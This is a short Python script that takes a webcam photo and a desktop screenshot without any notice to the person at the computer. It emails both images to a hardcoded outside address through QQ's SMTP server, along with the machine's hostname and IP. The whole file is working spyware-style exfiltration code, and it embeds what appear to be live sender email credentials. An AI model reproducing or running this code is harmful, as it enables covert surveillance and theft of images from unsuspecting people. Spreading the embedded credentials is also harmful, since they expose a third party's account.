#-*- conding:utf-8 -*-
import cv2
import os
from socket import gethostname,gethostbyname
from smtplib import SMTP,SMTPException
from email import message
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.header import Header
from PIL import ImageGrab

path = 'D:\\getpictures'#'C:\\ProgramData\\getpictures'
if not os.path.exists(path):
    os.makedirs(path)
hostname = gethostname()
ipaddr = gethostbyname(hostname)

def GetPhotos():
    cv2.namedWindow('camera',1)
    cap = cv2.VideoCapture(0)
    ret,frame = cap.read()
    cv2.imwrite(path + '\\person.png',frame)
    cap.release()
    desktop = ImageGrab.grab()
    desktop.save(path + '\\desktop.png')

def SendEmail():
    global path,hostname,ipaddr
    sender = "2818778417@qq.com"
    pwd = "fayccxytvkvqdegd"
    receiver = ["ljk743121@outlook.com",]

    message = MIMEMultipart("related")
    message["From"] = Header('python','utf-8')
    message["To"] = Header('python','utf-8')
    message['Subject'] = "CameraGet"
    msg_content = MIMEMultipart('alternative')
    mail_msg = '''
    <p>CameraGet</p>
    <br>
    <p>hostname:{},ipaddr:{}</p>
    <br>
    <p>
    Picture
    <img src="cid:img1">
    </p>
    <p>
    Desktop
    <img src="cid:img2">
    </p>
    '''.format(hostname,ipaddr)
    msg_content.attach(MIMEText(mail_msg,"html","utf-8"))
    message.attach(msg_content)
    with open(path + '\\person.png','rb') as f:
        img1 = MIMEImage(f.read())
    with open(path + '\\desktop.png','rb') as f:
        img2 = MIMEImage(f.read())
    img1.add_header('Content-ID','img1')
    message.attach(img1)
    img2.add_header('Content-ID','img2')
    message.attach(img2)
    try:
        #smtp = smtplib.SMTP_SSL('smtp.qq.com')#"smtp-mail.outlook.com"
        smtp = SMTP()
        smtp.connect('smtp.qq.com',25)
        smtp.login(sender,pwd)
        smtp.sendmail(sender,receiver,message.as_string())
        print ("Send OK")
    except SMTPException as e:
        print ("Error",e)


if __name__ == '__main__':
    GetPhotos()
    SendEmail()